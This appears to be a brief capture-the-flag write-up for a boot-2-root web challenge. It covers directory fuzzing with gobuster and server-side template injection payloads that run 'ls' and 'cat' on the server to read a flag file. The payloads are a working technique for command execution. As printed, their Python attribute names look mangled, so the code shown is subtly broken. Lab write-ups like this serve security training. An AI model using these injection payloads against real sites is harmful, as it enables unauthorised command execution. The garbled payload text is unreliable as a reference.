<img width="870" height="458" alt="image" src="https://github.com/user-attachments/assets/dd5b1617-dfea-4dd6-acb5-7a22af427b99" />## Challenge 1: Boot-2-Root : FLAG 1
<img width="529" height="943" alt="image" src="https://github.com/user-attachments/assets/b57fafcc-f574-4601-adc6-f204dfbb427d" />


Then gobuster to fuzz the website

<img width="870" height="458" alt="image" src="https://github.com/user-attachments/assets/dc6c66c6-af30-4b3e-ba86-a0e88b510f28" />

So we found /page exists, next we went into that site
It was like this,
<img width="839" height="286" alt="image" src="https://github.com/user-attachments/assets/02363902-0443-4740-8707-51672459a779" />
So we used SSTI injection to find the list of files
`{{ ''._class.mro[1].subclasses()[122].init.globals['builtins']['import_']('os').popen('ls').read() }}`
<img width="869" height="383" alt="image" src="https://github.com/user-attachments/assets/568e72db-e256-49c1-9ec1-d3c2011da64f" />

So we have found that there is a file named Fl4@G_0n3.txt.
Then I used the payload to print the contents of the file Fl4@G_0n3.txt
`{{ ''._class.mro[1].subclasses()[122].init.globals['builtins']['import_']('os').popen('cat Fl4@G_0n3.txt').read() }}`
Hence we got the flag!
<img width="445" height="196" alt="image" src="https://github.com/user-attachments/assets/c2fb057e-33ab-4b94-81a2-69d3548782e8" />

